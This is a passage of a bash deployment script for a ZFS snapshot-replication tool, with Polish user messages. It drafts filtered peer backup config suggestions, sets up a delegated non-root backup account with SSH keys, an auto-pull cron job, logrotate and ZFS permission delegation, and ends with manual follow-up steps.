        if [ "$rotating" = "yes" ] && [ -n "${PEER_PREVIOUS_PUBKEY:-}" ]; then
            printf '  grep -vF %s ~/.ssh/authorized_keys > /tmp/ak.$$ && mv /tmp/ak.$$ ~/.ssh/authorized_keys\n' \
                "'${PEER_PREVIOUS_PUBKEY}'"
        fi
    fi
    # Sanitized the same way do_join sanitizes PEER_CONF_INITIATOR_LABEL, so the
    # printed path is the one that is actually there.
    local my_label; my_label=$(hostname -s 2>/dev/null || hostname)
    my_label=$(printf '%s' "$my_label" | tr -c 'A-Za-z0-9._-' '-')
    echo "  # 3. usun manifest stworzony tam przez --join"
    echo "  rm -f $(peer_manifest_path "$my_label")"
    echo ">>> ===================================================================="
    echo ">>> Klucz hosta $PEER_HOST zostal w /root/.ssh/known_hosts -- to nasz"
    echo ">>> zapis o tym, kim oni sa, nie uprawnienie dla nich. Jesli naprawde"
    echo ">>> chcesz go usunac: ssh-keygen -f /root/.ssh/known_hosts -R $PEER_HOST"
    echo ">>> (usunie WSZYSTKIE wpisy dla tego hosta, nie tylko przypiety tutaj)."
    echo ">>> ===================================================================="
}

# do_draft_config -- best-effort, deliberately conservative. gen-cron.sh's INI
# is template-based ([dataset:X] refers to a [template:tier] this script has
# no way to know), so this does NOT fabricate schedule/retention/tiers -- it
# only lists candidates plus the conventional path/addressing, as
# commented-out stanzas for a human to turn into real [dataset:] sections.
#
# Role-aware since 2026-07-29 (was push-only before): snapget.sh v2.61+
# addresses pull literally (arg1 = the real remote name, never a base), so
# what to list and what field to emit both depend on PEER_SAVED_ROLE.
#   pull -- the peer HOLDS the source. List ITS datasets (unchanged query),
#           emit 'src = user@host:<literal-name>' with the LOCAL path
#           per-peer-nested ($PEER_SAVED_TARGET/$label/<name>) so multiple
#           peers can never collide under one local pool -- this exact shape
#           was impossible before the addressing flip (see
#           project_srcbase_path_composition_limit in memory).
#   push -- the peer HOLDS the target. Listing the peer's datasets would
#           suggest datasets we don't own; list LOCAL ones instead, emit
#           'dst = user@host:base' with THIS host nested under the peer's
#           target ($PEER_SAVED_TARGET/<this-host-label>/<name>), matching
#           the same collision-safe convention from the other direction.
# Splits a dataset listing against the list this pairing actually covers.
#
# Until 2026-07-29 the draft emitted one stanza per dataset the peer could
# see -- and `zfs allow` scopes OPERATIONS, not `zfs list` visibility, so the
# peer sees its whole tree. On real pve2 that was 81 identical-looking
# stanzas of which two were usable; uncommenting any of the other 79 produced
# a config that generates cleanly and fails at 2am with permission denied.
#
# Descendants are covered too (zfs allow is inherited), which is why the useful
# unit to suggest is the granted ROOT plus how many descendants it has -- that
# is exactly the -R decision -- rather than a stanza per descendant.
#
# Sets: DRAFT_ROOTS (name<TAB>descendant-count), DRAFT_MISSING (declared but
# not present on that host), DRAFT_UNCOVERED (present but outside the pairing,
# shallow ones only), DRAFT_DEEPER (how many uncovered ones were too deep to
# be worth printing).
draft_classify() {
    local full="$1" granted="$2"
    declare -ga DRAFT_ROOTS=() DRAFT_MISSING=() DRAFT_UNCOVERED=()
    declare -g DRAFT_DEEPER=0
    local ds n

    # Pure bash `case` matching throughout, deliberately: a dataset name is not
    # a regex, and the per-peer paths this feature invents routinely contain
    # dots (the label is derived from --peer, so 192.168.28.8 is a normal
    # component). Feeding that to grep would make '.' match any character.
    local -a present=() found=()
    while IFS= read -r ds; do [ -n "$ds" ] && present+=("$ds"); done <<< "$full"

    for ds in $granted; do
        n=0
        local seen=0 p
        for p in "${present[@]}"; do
            [ "$p" = "$ds" ] && { seen=1; continue; }
            case "$p" in "$ds"/*) n=$((n + 1)) ;; esac
        done
        if [ "$seen" -eq 1 ]; then
            DRAFT_ROOTS+=("$ds	$n")
        else
            DRAFT_MISSING+=("$ds")
        fi
    done

    local covered
    for ds in "${present[@]}"; do
        covered=0
        for n in $granted; do
            [ "$ds" = "$n" ] && { covered=1; break; }
            case "$ds" in "$n"/*) covered=1; break ;; esac
        done
        [ "$covered" -eq 1 ] && continue
        # Only the shallow ones get printed. The point of this section is "did
        # you forget to include something", which a first-level view answers;
        # a full dump would recreate the wall of noise this exists to remove.
        case "$ds" in
            */*/*) DRAFT_DEEPER=$((DRAFT_DEEPER + 1)) ;;
            *) DRAFT_UNCOVERED+=("$ds") ;;
        esac
    done
}

# The "not part of this pairing" section, shared by both roles. Never emitted
# as stanzas -- these are informational, and the whole point is that they must
# not look copy-pasteable.
draft_emit_uncovered() {
    local how_to_add="$1"
    { [ "${#DRAFT_UNCOVERED[@]}" -gt 0 ] || [ "$DRAFT_DEEPER" -gt 0 ]; } || return 0
    echo
    echo "# =========================================================="
    echo "# NIE OBJETE TA RELACJA -- do informacji, NIE kopiuj nizej."
    echo "# =========================================================="
    echo "# Ponizsze istnieja, ale nie sa czescia tego parowania."
    echo "# $how_to_add"
    echo "#"
    local ds
    for ds in "${DRAFT_UNCOVERED[@]}"; do echo "#   $ds"; done
    [ "$DRAFT_DEEPER" -gt 0 ] && echo "#   ... oraz $DRAFT_DEEPER glebszych (pominiete, to widok pierwszego poziomu)"
    return 0
}

do_draft_config() {
    local label="$1" mpath="$2"
    [ -r "$mpath" ] || die "no pairing for '$PEER_HOST' yet -- run --pair (and --join on the peer) first"
    # shellcheck disable=SC1090
    . "$mpath"
    local keyfile="$PEER_KEY_DIR/${label}_ed25519"
    [ -f "$keyfile" ] || die "expected keyfile $keyfile not found"
    local remote_user="${PEER_SAVED_ACCOUNT:-root}"
    local role="${PEER_SAVED_ROLE:-pull}"

    # $keyfile above is root's, and this function's own ssh runs as root, so it
    # keeps using it. The EMITTED -K is a different question: it belongs to
    # whichever account will run the cron line, which for a delegated setup
    # cannot read /root/.ssh/pairing at all.
    local job_keyfile; job_keyfile=$(local_keyfile_path "$label" "${PEER_SAVED_LOCAL_USER:-}")
    if [ -n "${PEER_SAVED_LOCAL_USER:-}" ] && [ ! -r "$job_keyfile" ]; then
        warn "expected $job_keyfile for ${PEER_SAVED_LOCAL_USER} but it is not there -- re-run --pair with --local-user=${PEER_SAVED_LOCAL_USER} to reinstall it"
    fi

    # The other half: -k. --pair verifies the peer's host key by hand (keyscan,
    # fingerprint, "CONFIRM this"), and until 2026-07-29 that verification then
    # sat in a file the job never opened -- so the nightly connection fell back
    # to accept-new and trusted whatever answered on its own first run. Emitted
    # only when the pinned file actually exists: a -k pointing at nothing turns
    # StrictHostKeyChecking=yes into a job that can never connect at all, which
    # is a worse outcome than the accept-new it replaces.
    # The port the pairing was made on. Emitted only when it is not 22: a
    # '-p 22' on every suggested line is noise, and noise is what trains people
    # to stop reading the flags. Silently dropping it was the older bug -- the
    # manifest knew the port, the ssh calls in THIS script used it, and the one
    # thing that ends up in cron did not.
    local job_port="${PEER_SAVED_PORT:-22}"
    local port_flag=""
    [ "$job_port" != "22" ] && port_flag=" -p ${job_port}"

    local job_knownhosts; job_knownhosts=$(local_knownhosts_path "$label" "${PEER_SAVED_LOCAL_USER:-}")
    local kh_flag=""
    if [ -f "$job_knownhosts" ]; then
        kh_flag=" -k ${job_knownhosts}"
    else
        warn "no pinned host-key file at $job_knownhosts -- this pairing predates host-key pinning for the job account, so the draft omits -k and the job would use accept-new. Re-run: bash deploy.sh --pair --peer=$PEER_HOST${PEER_SAVED_LOCAL_USER:+ --local-user=$PEER_SAVED_LOCAL_USER}"
    fi

    local outdir="/root/scripts/pairing"
    mkdir -p "$outdir"
    local out="$outdir/${label}.conf.suggested"

    local granted="${PEER_SAVED_DATASETS:-}"
    if [ -z "$granted" ]; then
        warn "manifest for '$PEER_HOST' has no dataset list -- every candidate will be listed unfiltered, as before 2026-07-29. Re-run --pair with --peer-datasets=\"...\" to get a filtered draft."
    fi

    if [ "$role" = "pull" ]; then
        log "listing datasets on ${remote_user}@${PEER_HOST} via the pairing key (pull: peer holds the source)..."
        local list
        list=$(ssh -i "$keyfile" -p "${PEER_SAVED_PORT:-22}" -o BatchMode=yes "${remote_user}@${PEER_HOST}" \
            "zfs list -H -o name") || die "could not list datasets on $PEER_HOST -- has --join run there yet?"
        [ -n "$granted" ] || granted="$list"
        draft_classify "$list" "$granted"
        {
            echo "# Kandydaci z hosta '$PEER_HOST' (rola: pull), wygenerowane przez --draft-config."
            echo "# NIC z tego nie jest gotowa sekcja INI ani nie jest zainstalowane."
            echo "# gen-cron.sh v4 wymaga [dataset:<path>] z polem 'use_template ='"
            echo "# odwolujacym sie do JUZ ISTNIEJACEGO [template:] w Twoim configu --"
            echo "# ten generator ich nie zna i ich nie zgaduje. To pole jest"
            echo "# OBOWIAZKOWE: bez niego gen-cron.sh konczy 'has no use_template'."
            echo "#"
            echo "# 'src' to LITERALNA nazwa na peerze (dokladnie to co widac w zfs"
            echo "# list tam) -- lokalna sciezka ponizej musi konczyc sie tym samym"
            echo "# ciagiem, gen-cron.sh sam wyliczy lokalny base."
            echo "#"
            echo "# Bez '-K' zadanie probowaloby uwierzytelnic sie domyslnym kluczem"
            echo "# SSH tego konta zamiast dedykowanego klucza tej relacji -- konto"
            echo "# ${remote_user} na peerze zna WYLACZNIE ten klucz."
            echo "#"
            echo "# '-k' to druga strona tego samego: przypiety klucz HOSTA peera,"
            echo "# ten sprawdzony recznie przy --pair. Bez niego zadanie wraca do"
            echo "# accept-new, czyli ufa temu, co odpowie przy pierwszym polaczeniu."
            [ -n "$kh_flag" ] || echo "# UWAGA: brak pliku $job_knownhosts -- '-k' pominiete, patrz log."
            if [ -n "$port_flag" ]; then
                echo "#"
                echo "# '-p ${job_port}': parowanie zrobiono na niestandardowym porcie."
                echo "# Bez niego zadanie poszloby na 22 -- a przypiety klucz hosta jest"
                echo "# zapisany jako '[host]:${job_port}', wiec i tak by go nie znalazlo."
            fi
            echo
            echo "# =========================================================="
            echo "# OBJETE TA RELACJA (${#DRAFT_ROOTS[@]}) -- tylko te maja 'zfs allow'"
            echo "# dla konta ${remote_user} na peerze. Reszta drzewa jest tam WIDOCZNA"
            echo "# (zfs allow ogranicza operacje, nie 'zfs list'), ale nieuzywalna."
            echo "# =========================================================="
            local ds n
            while IFS=$'\t' read -r ds n; do
                [ -n "$ds" ] || continue
                echo
                [ "$n" -gt 0 ] && echo "# ($ds ma $n datasetow potomnych -- 'zfs allow' dziedziczy"
                [ "$n" -gt 0 ] && echo "#  na nie, wiec jedno '-R' we flags obejmie caly podzbior)"
                echo "# [dataset:${PEER_SAVED_TARGET}/${label}/${ds}]"
                echo "#   src          = ${remote_user}@${PEER_HOST}:${ds}"
                echo "#   flags        = -K ${job_keyfile}${kh_flag}${port_flag}"
                echo "#   use_template = <WYBIERZ ISTNIEJACY [template:]>"
            done < <(printf '%s\n' "${DRAFT_ROOTS[@]}")
            if [ "${#DRAFT_MISSING[@]}" -gt 0 ]; then
                echo
                echo "# UWAGA: zadeklarowane w parowaniu, ale NIE ISTNIEJA na $PEER_HOST:"
                for ds in "${DRAFT_MISSING[@]}"; do echo "#   $ds"; done
            fi
            draft_emit_uncovered "Zeby dolozyc: --pair --peer=$PEER_HOST --peer-datasets=\"$granted <nowy>\", potem --join na peerze."
        } > "$out"
    else
        local my_label; my_label=$(hostname -s)
        log "listing LOCAL datasets (push: this host is the source, $PEER_HOST holds the target)..."
        local list
        list=$(zfs list -H -o name) || die "could not list local datasets"
        [ -n "$granted" ] || granted="$list"
        draft_classify "$list" "$granted"
        {
            echo "# Kandydaci LOKALNE (rola: push do '$PEER_HOST'), wygenerowane przez --draft-config."
            echo "# NIC z tego nie jest gotowa sekcja INI ani nie jest zainstalowane."
            echo "# gen-cron.sh v4 wymaga [dataset:<path>] z polem 'use_template ='"
            echo "# odwolujacym sie do JUZ ISTNIEJACEGO [template:] w Twoim configu --"
            echo "# ten generator ich nie zna i ich nie zgaduje. To pole jest"
            echo "# OBOWIAZKOWE: bez niego gen-cron.sh konczy 'has no use_template'."
            echo "#"
            echo "# Bez '-K' zadanie probowaloby uwierzytelnic sie domyslnym kluczem"
            echo "# SSH tego konta zamiast dedykowanego klucza tej relacji -- konto"
            echo "# ${remote_user} na peerze zna WYLACZNIE ten klucz."
            echo "#"
            echo "# '-k' to druga strona tego samego: przypiety klucz HOSTA peera,"
            echo "# ten sprawdzony recznie przy --pair. Bez niego zadanie wraca do"
            echo "# accept-new, czyli ufa temu, co odpowie przy pierwszym polaczeniu."
            [ -n "$kh_flag" ] || echo "# UWAGA: brak pliku $job_knownhosts -- '-k' pominiete, patrz log."
            if [ -n "$port_flag" ]; then
                echo "#"
                echo "# '-p ${job_port}': parowanie zrobiono na niestandardowym porcie."
                echo "# Bez niego zadanie poszloby na 22 -- a przypiety klucz hosta jest"
                echo "# zapisany jako '[host]:${job_port}', wiec i tak by go nie znalazlo."
            fi
            echo
            echo "# =========================================================="
            echo "# OBJETE TA RELACJA (${#DRAFT_ROOTS[@]}) -- te datasety zadeklarowano"
            echo "# przy parowaniu. Strona odbiorcza jest delegowana na peerze na jednym"
            echo "# korzeniu, wiec wypchniecie czegokolwiek innego tez by przeszlo --"
            echo "# ale wtedy config przestaje odpowiadac temu, co mowi manifest."
            echo "# =========================================================="
            local ds n
            while IFS=$'\t' read -r ds n; do
                [ -n "$ds" ] || continue
                echo
                [ "$n" -gt 0 ] && echo "# ($ds ma $n datasetow potomnych -- jedno '-R' we flags obejmie caly podzbior)"
                echo "# [dataset:$ds]"
                echo "#   dst          = ${remote_user}@${PEER_HOST}:${PEER_SAVED_TARGET}/${my_label}/${ds}"
                echo "#   flags        = -K ${job_keyfile}${kh_flag}${port_flag}"
                echo "#   use_template = <WYBIERZ ISTNIEJACY [template:]>"
            done < <(printf '%s\n' "${DRAFT_ROOTS[@]}")
            if [ "${#DRAFT_MISSING[@]}" -gt 0 ]; then
                echo
                echo "# UWAGA: zadeklarowane w parowaniu, ale NIE ISTNIEJA na tym hoscie:"
                for ds in "${DRAFT_MISSING[@]}"; do echo "#   $ds"; done
            fi
            draft_emit_uncovered "Zeby dolozyc: --pair --peer=$PEER_HOST --peer-datasets=\"$granted <nowy>\" (i --join na peerze)."
        } > "$out"
    fi
    log "draft napisany: $out -- przejrzyj recznie przed dotknieciem cron-configs"
}

if [ "$PAIR_MODE" -eq 1 ]; then
    do_pair
    exit 0
fi
if [ "$JOIN_MODE" -eq 1 ]; then
    do_join
    exit 0
fi

# ------------------------------------------------------------------------------
log "Phase 8: delegated non-root account"
# ------------------------------------------------------------------------------
# BACKUP_USER is about CREATION. Maintenance is automatic: if it is empty we
# look for an account that already has its own checkout and keep that one up to
# date. That is what lets a bare `bash deploy.sh` be correct on every host in
# the fleet without anyone tracking which machine has an account.
CREATE_ACCOUNT=1
if [ -z "$BACKUP_USER" ]; then
    CREATE_ACCOUNT=0
    for _cand in /home/*/zfs-snapshot-all; do
        [ -d "$_cand" ] || continue
        _owner=$(stat -c %U "$(dirname "$_cand")" 2>/dev/null) || continue
        id "$_owner" >/dev/null 2>&1 && { BACKUP_USER="$_owner"; break; }
    done
    [ -n "$BACKUP_USER" ] && log "detected existing delegated account: $BACKUP_USER (maintaining it; pass --backup-user to create one)"
fi

if [ -z "$BACKUP_USER" ]; then
    log "no delegated account on this host and none requested -- skipping (pass --backup-user=NAME to create one)"
elif [ "$CHECK_ONLY" -eq 1 ]; then
    if id "$BACKUP_USER" >/dev/null 2>&1; then
        log "  account $BACKUP_USER exists"
        id -nG "$BACKUP_USER" | tr ' ' '
' | grep -qx "zfsalert" || warn "  $BACKUP_USER not in group zfsalert -- it could not queue alerts"
        [ -x "/home/$BACKUP_USER/notify-fail.sh" ] || warn "  /home/$BACKUP_USER/notify-fail.sh missing -- that account cannot report findings"
        [ -f "/etc/logrotate.d/zfs-snapshot-all-$BACKUP_USER" ] || warn "  no logrotate stanza for $BACKUP_USER"
    else
        warn "  account $BACKUP_USER does not exist -- re-run without --check-only to create it"
    fi
elif [ "$CREATE_ACCOUNT" -eq 0 ] && ! id "$BACKUP_USER" >/dev/null 2>&1; then
    log "no delegated account to maintain -- skipping"
else
    USERNAME="$BACKUP_USER"
    HOMEDIR="/home/$USERNAME"
    # shellcheck disable=SC2206
    DATASETS=($BACKUP_USER_DATASETS)
    ACCOUNT_REPO_DIR="$HOMEDIR/zfs-snapshot-all"
    # ------------------------------------------------------------------------------
    log "Phase 8a: service account $USERNAME"
    # ------------------------------------------------------------------------------
    if id "$USERNAME" >/dev/null 2>&1; then
        log "user $USERNAME already exists, leaving it alone"
    else
        useradd -m -s /bin/bash -c "zfs-snapshot-all delegated backup account" "$USERNAME" \
            || die "useradd failed"
        passwd -l "$USERNAME" >/dev/null || warn "could not lock password for $USERNAME"
        log "created user $USERNAME (uid $(id -u "$USERNAME")), password locked (SSH key only)"
    fi

    # ------------------------------------------------------------------------------
    log "Phase 8b: lock/state directory"
    # ------------------------------------------------------------------------------
    RUNDIR="$HOMEDIR/run"
    mkdir -p "$RUNDIR"
    chown "$USERNAME:$USERNAME" "$RUNDIR"
    log "LOCKDIR for this account: $RUNDIR"

    # ------------------------------------------------------------------------------
    log "Phase 8c: SSH keypair"
    # ------------------------------------------------------------------------------
    SSHDIR="$HOMEDIR/.ssh"
    if [ -f "$SSHDIR/id_ed25519" ]; then
        log "SSH keypair already exists, leaving it alone"
    else
        su "$USERNAME" -c "mkdir -p ~/.ssh && chmod 700 ~/.ssh && ssh-keygen -t ed25519 -N '' -f ~/.ssh/id_ed25519 -C '${USERNAME}@$(hostname -s)'" \
            || die "ssh-keygen failed"
    fi
    log "public key (see Part 6 below for what to do with it):"
    cat "$SSHDIR/id_ed25519.pub"

    # ------------------------------------------------------------------------------
    log "Phase 8d: repo checkout at $ACCOUNT_REPO_DIR (readable+executable by $USERNAME)"
    # ------------------------------------------------------------------------------
    if [ -d "$ACCOUNT_REPO_DIR/.git" ]; then
        log "$ACCOUNT_REPO_DIR is already a git repo, pulling..."
        su "$USERNAME" -c "git -C '$ACCOUNT_REPO_DIR' remote get-url origin 2>/dev/null" | grep -qF "$REPO_URL" \
            || warn "existing repo's origin does not match $REPO_URL -- check manually"
        su "$USERNAME" -c "git -C '$ACCOUNT_REPO_DIR' pull --ff-only origin main" \
            || die "git pull --ff-only failed -- local repo has diverged, resolve manually"

    elif [ -d "$ACCOUNT_REPO_DIR" ] && [ -n "$(ls -A "$ACCOUNT_REPO_DIR" 2>/dev/null)" ]; then
        log "$ACCOUNT_REPO_DIR exists with files but is not a git repo (plain scripts from an earlier manual copy?)"
        BACKUP_DIR="${REPO_DIR}.bak-preGit-$(date +%Y%m%d%H%M%S)"
        mkdir -p "$BACKUP_DIR"
        for f in snapsend.sh snapget.sh delsnaps.sh gen-cron.sh; do
            if [ -e "$ACCOUNT_REPO_DIR/$f" ]; then
                mv "$ACCOUNT_REPO_DIR/$f" "$BACKUP_DIR/"
                log "  moved $f -> $BACKUP_DIR/"
            fi
        done
        chown -R "$USERNAME:$USERNAME" "$BACKUP_DIR"

        su "$USERNAME" -c "cd '$ACCOUNT_REPO_DIR' && git init && git remote add origin '$REPO_URL' && git fetch origin && git checkout -b main --track origin/main" \
            || die "git init/checkout failed"

        log "Diff against backup (should be empty besides new .git/.gitignore/.gitattributes):"
        diff -rq "$BACKUP_DIR" "$ACCOUNT_REPO_DIR" 2>&1 | grep -v "^Only in $ACCOUNT_REPO_DIR:" || true

    else
        log "$ACCOUNT_REPO_DIR does not exist or is empty -- plain clone"
        su "$USERNAME" -c "git clone '$REPO_URL' '$ACCOUNT_REPO_DIR'" || die "git clone failed"
    fi
    # Only the standalone executables, NEVER a blanket *.sh. lib-zfs-snap.sh is
    # sourced, not executed, and git tracks it as 100644 -- chmod +x on it makes
    # the checkout permanently dirty with a mode change, and the hourly
    # `git pull --ff-only` this account runs then FAILS the first time that file
    # changes upstream. Found on both metropolis accounts, inherited from the
    # old deploy_backup_user.sh.
    for f in snapsend.sh snapget.sh delsnaps.sh gen-cron.sh check-snap-age.sh deploy.sh; do
        [ -e "$ACCOUNT_REPO_DIR/$f" ] && chmod +x "$ACCOUNT_REPO_DIR/$f"
    done

    # ------------------------------------------------------------------------------
    log "Phase 8e: auto-pull cron line (this account's own crontab)"
    # ------------------------------------------------------------------------------
    PULL_LINE="15 * * * * cd $ACCOUNT_REPO_DIR && git pull --ff-only origin main >>$HOMEDIR/git-pull.log 2>&1"
    if su "$USERNAME" -c "crontab -l 2>/dev/null" | grep -qF "$ACCOUNT_REPO_DIR && git pull"; then
        log "auto-pull cron line already present, leaving it alone"
    else
        su "$USERNAME" -c "(crontab -l 2>/dev/null; echo '$PULL_LINE') | crontab -" \
            || warn "could not install auto-pull cron line -- add it manually"
        log "added auto-pull cron line to $USERNAME's crontab"
    fi

    # ------------------------------------------------------------------------------
    log "Phase 8f: alerting access + log rotation for this account"
    # ------------------------------------------------------------------------------
    # This account cannot see ANYTHING under /root: that directory is 0700, so the
    # notify scripts, the alert config and the alert queue are all out of reach.
    # The shortcut of opening /root/scripts to a group is a privilege escalation --
    # root executes those scripts from cron, so an account able to write there could
    # replace them. Instead the two accounts share one group-writable DATA directory
    # (created in phase 3 above) and this account gets its own copies of the
    # two reporting scripts. alert-digest.sh stays root-only and reads the shared
    # queue, so the host still sends exactly ONE mail a day covering both accounts.
    ALERT_GROUP="zfsalert"
    ALERT_SHARED_DIR="/var/lib/zfs-snapshot-all"
    ALERT_CONF="/etc/zfs-alert.conf"

    # No "did you run the other script first" guard here any more: phase 3 of THIS
    # script created the group and the shared directory a few hundred lines above.
    # Removing that ordering dependency is the whole point of the merge.
        if id -nG "$USERNAME" | tr ' ' '\n' | grep -qx "$ALERT_GROUP"; then
            log "$USERNAME already in group $ALERT_GROUP"
        else
            usermod -aG "$ALERT_GROUP" "$USERNAME" && log "added $USERNAME to group $ALERT_GROUP"
            log "  NOTE: group membership applies to NEW sessions -- this account's cron picks it up on its next run"
        fi

        # Same two scripts root has, same shared queue, same config. Only the digest
        # is not duplicated: two digests would mean two mails per host per day.
        for s in notify-fail notify-warn; do
            if [ -f "/root/scripts/$s.sh" ]; then
                install -o "$USERNAME" -g "$USERNAME" -m 0755 "/root/scripts/$s.sh" "$HOMEDIR/$s.sh" \
                    && log "installed $HOMEDIR/$s.sh (copy of root's, same shared queue)"
            else
                warn "/root/scripts/$s.sh not found -- $USERNAME has no way to report findings"
            fi
        done
        [ -r "$ALERT_CONF" ] || warn "$ALERT_CONF missing -- this account will fall back to built-in defaults (daily)"

    LOGROTATE_CONF="/etc/logrotate.d/zfs-snapshot-all-$USERNAME"
    LOGROTATE_MARKER="# zfs-snapshot-all $USERNAME logrotate v1"
    if [ -e "$LOGROTATE_CONF" ] && grep -qF "$LOGROTATE_MARKER" "$LOGROTATE_CONF" 2>/dev/null; then
        log "$LOGROTATE_CONF already current, leaving it alone"
    else
        # A SEPARATE stanza from root's, and the reason is 'create': rotating these
        # with root's stanza would hand the fresh file to root:root, and this account
        # -- which owns the directory but not that file -- could no longer append.
        # Its cron would stop logging silently, since the redirect is >> in the
        # background with nobody reading the error.
        cat > "$LOGROTATE_CONF" <<EOF
$LOGROTATE_MARKER -- managed by deploy.sh, re-run it to update.
$HOMEDIR/git-pull.log
$HOMEDIR/zfs-snapshot-stats.log
{
    monthly
    rotate 24
    maxsize 50M
    compress
    delaycompress
    notifempty
    missingok
    su $USERNAME $USERNAME
    create 0644 $USERNAME $USERNAME
}
EOF
        chmod 0644 "$LOGROTATE_CONF"
        log "created $LOGROTATE_CONF (monthly, keep 24, owned by $USERNAME)"
    fi
    if command -v logrotate >/dev/null; then
        logrotate --debug "$LOGROTATE_CONF" >/dev/null 2>&1 \
            && log "  logrotate config parses cleanly" \
            || warn "  logrotate rejected $LOGROTATE_CONF -- check it by hand"
    fi

    # ------------------------------------------------------------------------------
    log "Phase 8g: ZFS delegation on ${DATASETS[*]}"
    # ------------------------------------------------------------------------------
    # ZFS_PERMS is defined once in the config block at the top -- see the note
    # there about 'bookmark' and the 'delegation-verbs' contract.
    for ds in "${DATASETS[@]}"; do
        if ! zfs list -H -o name -- "$ds" >/dev/null 2>&1; then
            warn "dataset $ds does not exist on this host -- skipping (create it first, then: zfs allow -u $USERNAME $ZFS_PERMS $ds)"
            continue
        fi
        zfs allow -u "$USERNAME" "$ZFS_PERMS" "$ds" || die "zfs allow failed for $ds"
        log "delegated on $ds:"
        zfs allow "$ds" | grep "$USERNAME" || true
    done

    echo
    log "===================================================================="
fi


# In check-only mode the exit code IS the result -- 0 means this host is ready,
# non-zero means something above needs attention. The full deploy path keeps
# returning 0 on warnings, because there the warnings are advisory and the work
# has already been done.
if [ "$CHECK_ONLY" -eq 1 ]; then
    if [ "$PROBLEMS" -gt 0 ]; then
        warn "audit found $PROBLEMS issue(s) on $(hostname -s 2>/dev/null || hostname)"
        exit 1
    fi
    log "audit clean on $(hostname -s 2>/dev/null || hostname)"
    exit 0
fi
echo
log "===================================================================="
log "Automated part done. Manual steps remaining (Part 5, NOT scripted):"
log "===================================================================="
cat <<'EOF'

  1. Add the actual snapsend.sh / snapget.sh / delsnaps.sh cron lines for
     THIS host's datasets. There is no generic template here on purpose --
     copying another host's dataset names blindly is how backups silently
     stop protecting the right data. For each job, follow the pattern
     already used on pve0/pve1:

       <schedule> /root/scripts/zfs-snapshot-all/snapsend.sh -m <prefix> \
         [-e] [-r] [-u] [-z] -v 3 <DATASETS> [<REMOTE>] \
         2>>/root/scripts/cron.log || /root/scripts/notify-fail.sh "<short job name>"

     Same pattern for delsnaps.sh (retention) -- always pass -R and a
     specific enough pattern (e.g. automated_hourly, not just automated_)
     unless a flat/blanket retention is genuinely what you want for that
     host.

  2. Before adding a new schedule, sanity-check it against what's ALREADY
     in crontab -l on this host -- specifically watch for jobs that can
     legitimately overrun into the next scheduled slot for a DIFFERENT job
     touching related data (this is what caused the original silent
     backup-gap bug and the near-miss on hdd/lxc weekly snapshots). The
     per-target flock lock (added 2026-07-07) protects against two
     invocations of the SAME target colliding, but does not protect two
     DIFFERENT jobs from stepping on each other's dataset lifecycle
     (e.g. a pruning job racing a send job on the same dataset).

  3. After adding cron lines, verify with a manual dry-run first:
       ./snapsend.sh -n <DATASETS> [<REMOTE>]   # -n = read-only, no side effects
     and only then let cron pick it up.

  4. If mail alerting (Part 4 above) needs a relay because direct postfix
     delivery didn't work: that requires host-specific SMTP credentials and
     is a decision for a human, not this script -- see the notes it printed
     above.

EOF
